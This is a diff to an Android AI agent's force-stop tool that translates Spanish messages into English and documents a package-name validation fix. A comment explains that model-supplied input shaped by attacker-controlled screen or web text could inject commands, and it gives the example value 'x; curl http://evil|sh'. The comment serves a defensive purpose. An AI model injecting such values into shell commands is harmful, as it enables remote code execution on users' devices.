@@ -17,7 +17,7 @@ import com.blackclaw.android.tool.ToolResult
  */
 class ForceStopAppTool : BaseTool() {
     override fun getName() = "force_stop_app"
-    override fun getDisplayName() = "Forzar detención"
+    override fun getDisplayName() = "Force stop app"
     override fun getDescriptionEN() =
         "Truly force-stop a package via `am force-stop`. Requires Shizuku or self-paired ADB. " +
         "Use when the user wants to kill an app, not just leave it. Falls back to error " +
@@ -33,7 +33,7 @@ class ForceStopAppTool : BaseTool() {
             return ToolResult.error("Sin acceso privilegiado (Shizuku/ADB). Usa close_app (HOME) en su lugar.")
         }
         val pkg = requireString(params, "package").trim()
-        if (pkg.isEmpty()) return ToolResult.error("package vacío")
+        if (pkg.isEmpty()) return ToolResult.error("empty package")
         // COMMAND INJECTION FIX: this value is interpolated into `sh -c`, and it comes
         // from the model — which reads attacker-influenceable screen text, notification
         // bodies and web pages. Without validation, package="x; curl http://evil|sh"
@@ -42,12 +42,12 @@ class ForceStopAppTool : BaseTool() {
         // It also subsumes the old `pkg == "com.blackclaw.android"` self-check, which
         // was bypassable by any variation such as a trailing separator.
         if (!SecurityPolicy.isValidPackageName(pkg)) {
-            return ToolResult.error("Nombre de paquete inválido: $pkg")
+            return ToolResult.error("Invalid package name: $pkg")
         }
         SecurityPolicy.protectionReason(ClawApplication.instance, pkg)?.let { reason ->
             return ToolResult.error("No puedo detener $pkg: $reason")
         }
-        PrivilegedShell.exec("am force-stop $pkg") ?: return ToolResult.error("am force-stop falló")
-        return ToolResult.success("Forzada la detención de $pkg")
+        PrivilegedShell.exec("am force-stop $pkg") ?: return ToolResult.error("am force-stop failed")
+        return ToolResult.success("Force-stopped $pkg")
     }
 }
